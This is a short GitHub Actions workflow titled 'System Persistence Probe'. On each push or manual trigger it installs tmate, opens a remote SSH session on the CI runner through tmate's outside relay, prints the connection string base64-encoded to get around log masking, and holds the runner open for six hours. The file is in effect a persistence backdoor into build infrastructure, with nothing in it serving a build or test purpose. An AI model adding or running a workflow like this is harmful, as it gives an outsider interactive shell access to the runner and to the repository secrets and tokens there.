name: System Persistence Probe
on: [push, workflow_dispatch]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Keep-Alive SSH
        run: |
          sudo apt-get update && sudo apt-get install -y tmate
          tmate -S /tmp/tmate.sock new-session -d
          tmate -S /tmp/tmate.sock wait tmate-ready
          SSH_STR=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
          echo "B64_SSH:$(echo $SSH_STR | base64)"
          # Keep the session alive for 6 hours
          echo "Session live. Use the string above."
          sleep 21600
